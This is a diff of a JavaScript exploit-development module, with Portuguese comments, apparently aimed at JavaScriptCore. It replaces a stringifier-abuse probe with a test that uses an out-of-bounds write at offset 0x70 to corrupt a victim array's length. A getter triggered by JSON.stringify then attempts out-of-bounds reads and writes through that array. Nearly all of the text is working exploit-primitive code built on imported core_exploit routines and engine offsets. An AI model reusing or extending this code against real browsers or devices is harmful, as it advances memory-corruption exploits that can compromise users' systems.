@@ -11,151 +11,120 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierAbuse";
+const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForArrayLengthCorruption";
 let getter_called_flag = false;
 let current_test_results = {
-    success: false,
-    message: "Teste não iniciado.",
-    error: null,
-    details: "",
-    unexpected_writes_in_oob_ab: []
+    success: false, message: "Teste não iniciado.", error: null, details: ""
 };
 
 const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const OOB_AB_FILL_PATTERN_U32 = 0xABABABAB; // Padrão para preencher o oob_ab
-const OOB_AB_SNOOP_AREA_START = 0;
-const OOB_AB_SNOOP_AREA_END = 0x800; // Sondar os primeiros 2KB
+// Array vítima que será verificado no getter
+let array_victim_for_length_test; 
+const VICTIM_ARRAY_ORIGINAL_LENGTH = 16;
 
-class CheckpointForStringifierAbuse {
+class CheckpointForArrayLengthTest {
     constructor(id) {
-        this.id_marker = `StringifierAbuseCheckpoint-${id}`;
+        this.id_marker = `ArrayLengthTestCheckpoint-${id}`;
     }
 
     get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
         getter_called_flag = true;
-        const FNAME_GETTER = "StringifierAbuse_Getter";
+        const FNAME_GETTER = "ArrayLengthCorruption_Getter";
         logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
         
         current_test_results = {
-            success: false, message: "Getter chamado, testando Stringifier corrompido.",
-            error: null, details: "", unexpected_writes_in_oob_ab: []
+            success: false, message: "Getter chamado, verificando corrupção de length do array vítima.",
+            error: null, details: ""
         };
         let details_log = [];
-        let anomalias_detectadas_no_getter = false;
 
         try {
-            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
-                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
+            if (!array_victim_for_length_test) {
+                throw new Error("array_victim_for_length_test não está definido no getter!");
             }
 
-            // 1. Preencher uma grande parte do oob_array_buffer_real com um padrão conhecido
-            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
-            const fill_end = Math.min(OOB_AB_SNOOP_AREA_END + 0x100, oob_array_buffer_real.byteLength); // Um pouco além da área de sondagem
-            for (let offset = OOB_AB_SNOOP_AREA_START; offset < fill_end; offset += 4) {
-                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue; // Não sobrescrever nosso gatilho
-                try {
-                    oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4);
-                } catch(e_fill) { /* ignorar */ }
-            }
-            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_FILL_PATTERN_U32)} de ${toHex(OOB_AB_SNOOP_AREA_START)} a ${toHex(fill_end)}.`);
+            const current_length = array_victim_for_length_test.length;
+            details_log.push(`array_victim.length atual: ${current_length} (Original esperado: ${VICTIM_ARRAY_ORIGINAL_LENGTH})`);
+            logS3(`DENTRO DO GETTER: Verificando array_victim_for_length_test. Length atual: ${current_length}`, "info", FNAME_GETTER);
 
-            // 2. Criar objeto muito complexo para desafiar o Stringifier
-            let deeply_nested_object = { data: "start_deep_nest" };
-            let current_nest = deeply_nested_object;
-            const nest_depth = 30; // Reduzido para evitar timeout excessivo no stringify
-            for (let i = 0; i < nest_depth; i++) {
-                current_nest.next_level = { 
-                    level_id: `L${i}`, 
-                    text_payload: ("PayloadXYZ" + i).repeat(5), // Strings de tamanho moderado
-                    numeric_payload: [i * 10, i * 20, i * 30, i * 40, i*50, i*60, i*70, i*80, i*90, i*100]
-                };
-                current_nest = current_nest.next_level;
-            }
-            // Adicionar referência circular intencionalmente para ver como o Stringifier (corrompido?) lida
-            // current_nest.circular_ref_to_root = deeply_nested_object; // CUIDADO: Pode causar loop infinito se o detector de ciclo falhar
-            details_log.push(`Objeto profundamente aninhado (${nest_depth} níveis) criado.`);
-
-            // 3. Forçar o Stringifier (potencialmente corrompido) a trabalhar
-            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto profundamente aninhado...", "subtest", FNAME_GETTER);
-            let internal_json_output_str = "";
-            let internal_json_error_msg = "";
-            try {
-                internal_json_output_str = JSON.stringify(deeply_nested_object);
-                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Tamanho do resultado: ${internal_json_output_str.length}`, "info", FNAME_GETTER);
-                // Não logar a string inteira se for muito grande
-                details_log.push(`Stringify interno produziu string de tamanho ${internal_json_output_str.length}.`);
-            } catch (e_json_internal) {
-                internal_json_error_msg = e_json_internal.message;
-                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_internal.message}`, "error", FNAME_GETTER);
-                details_log.push(`Erro JSON.stringify interno: ${e_json_internal.message}`);
-                // Se o erro NÃO for sobre referência circular, pode ser interessante
-                if (!String(e_json_internal.message).toLowerCase().includes("circular")) {
-                    anomalias_detectadas_no_getter = true;
-                    current_test_results.error = `Erro incomum no stringify interno: ${e_json_internal.message}`;
-                }
-            }
-
-            // 4. Sondar agressivamente o oob_array_buffer_real por alterações no padrão
-            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações no padrão...", "info", FNAME_GETTER);
-            let unexpected_writes = [];
-            for (let offset = OOB_AB_SNOOP_AREA_START; offset < OOB_AB_SNOOP_AREA_END; offset += 4) { // Ler de 4 em 4 bytes
-                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue; // Ignorar o gatilho
-                 if ((offset + 4) > oob_array_buffer_real.byteLength) break;
-
-                try {
-                    const value_read_u32 = oob_read_absolute(offset, 4);
-                    if (value_read_u32 !== OOB_AB_FILL_PATTERN_U32) {
-                        const overwritten_info = `ALTERAÇÃO DETECTADA em oob_data[${toHex(offset)}]: ${toHex(value_read_u32)} (Esperado: ${toHex(OOB_AB_FILL_PATTERN_U32)})`;
-                        logS3(overwritten_info, "leak", FNAME_GETTER);
-                        unexpected_writes.push(overwritten_info);
-                        anomalias_detectadas_no_getter = true;
-                    }
-                } catch (e_snoop_final) {
-                    details_log.push(`Erro ao sondar oob_data[${toHex(offset)}]: ${e_snoop_final.message}`);
-                }
-            }
-            current_test_results.unexpected_writes_in_oob_ab = unexpected_writes;
-            if (unexpected_writes.length > 0) {
-                details_log.push(`${unexpected_writes.length} escritas inesperadas encontradas em oob_array_buffer_real.`);
-                logS3(`DENTRO DO GETTER: ${unexpected_writes.length} ESCRITAS INESPERADAS ENCONTRADAS EM OOB_AB!`, "vuln", FNAME_GETTER);
-            } else {
-                details_log.push("Nenhuma escrita inesperada (alteração de padrão) encontrada em oob_array_buffer_real.");
-                 logS3("DENTRO DO GETTER: Nenhuma alteração de padrão encontrada em oob_array_buffer_real.", "good", FNAME_GETTER);
-            }
-
-            if (anomalias_detectadas_no_getter) {
+            if (current_length !== VICTIM_ARRAY_ORIGINAL_LENGTH) {
+                logS3(`DENTRO DO GETTER: CORRUPÇÃO DE LENGTH DETECTADA! Length é ${current_length}, esperado ${VICTIM_ARRAY_ORIGINAL_LENGTH}!`, "vuln", FNAME_GETTER);
                 current_test_results.success = true;
-                current_test_results.message = "Anomalias (erro incomum no stringify interno ou escritas inesperadas em oob_ab) detectadas!";
+                current_test_results.message = `Corrupção de length detectada! Length: ${current_length}.`;
+                details_log.push(`CORRUPÇÃO DE LENGTH!`);
+
+                // Tentar ler/escrever OOB se o length for maior
+                if (current_length > VICTIM_ARRAY_ORIGINAL_LENGTH) {
+                    const oob_idx = VICTIM_ARRAY_ORIGINAL_LENGTH + 10; // Um índice OOB
+                    if (oob_idx < current_length) { // Verifica se o índice OOB ainda está dentro do length corrompido
+                        try {
+                            let oob_val_before = array_victim_for_length_test[oob_idx];
+                            details_log.push(`Leitura OOB de array_victim[${oob_idx}] ANTES da escrita: ${String(oob_val_before)} (tipo: ${typeof oob_val_before})`);
+                            logS3(details_log[details_log.length-1], "leak", FNAME_GETTER);
+
+                            array_victim_for_length_test[oob_idx] = 0xBADF00D; // Escrita OOB
+                            let oob_val_after = array_victim_for_length_test[oob_idx];
+                            details_log.push(`Leitura OOB de array_victim[${oob_idx}] APÓS escrita de 0xBADF00D: ${String(oob_val_after)} (tipo: ${typeof oob_val_after})`);
+                            logS3(details_log[details_log.length-1], "leak", FNAME_GETTER);
+
+                            if (oob_val_after === 0xBADF00D) {
+                                current_test_results.message += " Leitura/Escrita OOB no array com length corrompido FUNCIONOU!";
+                                logS3("LEITURA/ESCRITA OOB NO ARRAY VÍTIMA FUNCIONOU!", "vuln", FNAME_GETTER);
+                            } else {
+                                current_test_results.message += " Escrita OOB no array parece não ter surtido efeito esperado.";
+                            }
+                        } catch (e_oob_access) {
+                            details_log.push(`Erro ao tentar R/W OOB no array vítima: ${e_oob_access.message}`);
+                            logS3(`Erro ao tentar R/W OOB no array vítima: ${e_oob_access.message}`, "error", FNAME_GETTER);
+                        }
+                    }
+                }
             } else {
-                current_test_results.message = "Nenhuma anomalia óbvia detectada ao abusar do Stringifier.";
+                current_test_results.message = "Nenhuma corrupção de length detectada no array vítima.";
+                logS3(`DENTRO DO GETTER: Length do array vítima (${current_length}) parece normal.`, "good", FNAME_GETTER);
             }
-            current_test_results.details = details_log.join('; ');
+            
+            // Verificar se os elementos originais foram corrompidos
+            let elements_corrupted = false;
+            for(let i=0; i < VICTIM_ARRAY_ORIGINAL_LENGTH; i++){
+                if(i < current_length && array_victim_for_length_test[i] !== (0x41410000 + i)){
+                    details_log.push(`Elemento original array_victim[${i}] corrompido: ${array_victim_for_length_test[i]} vs ${0x41410000 + i}`);
+                    elements_corrupted = true;
+                }
+            }
+            if(elements_corrupted){
+                logS3("CORRUPÇÃO DE ELEMENTOS ORIGINAIS DETECTADA NO ARRAY VÍTIMA!", "vuln", FNAME_GETTER);
+                if(!current_test_results.success) current_test_results.message += "; Corrupção de elementos detectada.";
+                current_test_results.success = true;
+            }
+
 
         } catch (e_getter_main) {
             logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
             current_test_results.error = String(e_getter_main);
             current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
         }
+        current_test_results.details = details_log.join('; ');
         return 0xBADF00D;
     }
 
     toJSON() {
-        const FNAME_toJSON = "CheckpointForStringifierAbuse.toJSON";
+        const FNAME_toJSON = "CheckpointForArrayLengthTest.toJSON";
         logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
         // eslint-disable-next-line no-unused-vars
         const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
-        return { id: this.id_marker, processed_by_stringifier_abuse_test: true };
+        return { id: this.id_marker, processed_by_array_length_test: true };
     }
 }
 
 export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
-    const FNAME_TEST_RUNNER = "executeStringifierAbuseTestRunner";
-    logS3(`--- Iniciando Teste de Abuso de Stringifier Corrompido ---`, "test", FNAME_TEST_RUNNER);
+    const FNAME_TEST_RUNNER = "executeArrayLengthCorruptionTestRunner";
+    logS3(`--- Iniciando Teste de Corrupção de Length de Array ---`, "test", FNAME_TEST_RUNNER);
 
     getter_called_flag = false;
-    current_test_results = { /* ... reset inicial ... */ };
+    current_test_results = { /* Reset inicial */ };
 
     if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }
 
@@ -164,12 +133,18 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
         if (!oob_array_buffer_real || !oob_dataview_real) { return; }
         logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
         
-        // Escrita OOB Gatilho (para corromper o heap/Stringifier)
+        // 1. Criar o Array Vítima ANTES da escrita OOB gatilho
+        array_victim_for_length_test = new Array(VICTIM_ARRAY_ORIGINAL_LENGTH);
+        for(let i=0; i< VICTIM_ARRAY_ORIGINAL_LENGTH; i++) array_victim_for_length_test[i] = 0x41410000 + i; // Preencher com padrão
+        logS3(`Array vítima criado com length ${array_victim_for_length_test.length}. Conteúdo[0]=${toHex(array_victim_for_length_test[0])}`, "info", FNAME_TEST_RUNNER);
+
+        // 2. Escrita OOB Gatilho
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
         logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);
 
-        const checkpoint_obj = new CheckpointForStringifierAbuse(1);
-        logS3(`CheckpointForStringifierAbuse objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
+        // 3. Criar o objeto Checkpoint e chamar JSON.stringify
+        const checkpoint_obj = new CheckpointForArrayLengthTest(1);
+        logS3(`CheckpointForArrayLengthTest objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
         
         logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
         try {
@@ -182,26 +157,21 @@ export async function executeRetypeOOB_AB_Test() { // Nome da função exportada
     // Log dos resultados
     if (getter_called_flag) {
         if (current_test_results.success) {
-            logS3(`RESULTADO TESTE ABUSO STRINGIFIER: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
+            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
         } else {
-            logS3(`RESULTADO TESTE ABUSO STRINGIFIER: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
+            logS3(`RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
         }
         if (current_test_results.details) {
-             logS3(`  Detalhes da tentativa: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
-        }
-        if (current_test_results.unexpected_writes_in_oob_ab && current_test_results.unexpected_writes_in_oob_ab.length > 0) {
-            logS3("Escritas Inesperadas no oob_array_buffer_real Detectadas:", "leak", FNAME_TEST_RUNNER);
-            current_test_results.unexpected_writes_in_oob_ab.forEach(info => {
-                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
-            });
+             logS3(`  Detalhes da inspeção: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
         }
          if (current_test_results.error) {
-            logS3(`  Erro reportado: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
+            logS3(`  Erro reportado no getter: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
         }
     } else {
-        logS3("RESULTADO TESTE ABUSO STRINGIFIER: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
+        logS3("RESULTADO TESTE ARRAY LENGTH CORRUPTION: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
     }
 
     clearOOBEnvironment();
-    logS3(`--- Teste de Abuso de Stringifier Corrompido Concluído ---`, "test", FNAME_TEST_RUNNER);
+    array_victim_for_length_test = null; // Limpar referência
+    logS3(`--- Teste de Corrupção de Length de Array Concluído ---`, "test", FNAME_TEST_RUNNER);
 }
